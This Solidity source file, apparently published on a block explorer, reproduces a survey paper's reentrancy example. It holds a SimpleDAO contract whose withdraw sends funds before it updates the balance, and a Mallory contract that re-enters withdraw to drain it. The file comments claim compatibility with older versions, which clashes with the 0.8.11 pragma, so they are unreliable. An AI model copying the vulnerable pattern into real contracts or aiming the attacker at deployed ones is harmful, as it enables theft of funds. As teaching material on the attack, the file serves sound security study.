/**
 *Submitted for verification at FtmScan.com on 2022-02-07
*/

/*
 * Example taken from the paper by N. Atzei, M. Bartoletti, and T. Cimoli, “A Survey of Attacks on Ethereum Smart Contracts (SoK),” in Principles of Security and Trust, 2017                                                                                 
 * http://blockchain.unica.it/projects/ethereum-survey/attacks.html#simpledao
 *
 * Modified for solidity 0.5 compatibility and removed unecessary
 * functions/variables.
 */

pragma solidity 0.8.11;
// this code also works with older solidity
/*pragma solidity ^0.4.19;*/


contract SimpleDAO {
    mapping (address => uint) public credit;
    address public owner;

    function donate(address to) payable public {
        credit[to] += msg.value;
    }

    function withdraw(uint amount) public {
        if (credit[msg.sender] >= amount) {
            msg.sender.call{value: amount}("");
            credit[msg.sender] -= amount;
        }
    }

    function queryCredit(address to) public view returns (uint) {
        return credit[to];
    }
}

contract Mallory {
    SimpleDAO public dao;
    address owner;

    receive() external payable  {
        dao.withdraw(dao.queryCredit(address(this)));
    }

    function setDAO(address addr) public {
        dao = SimpleDAO(addr);
    }
}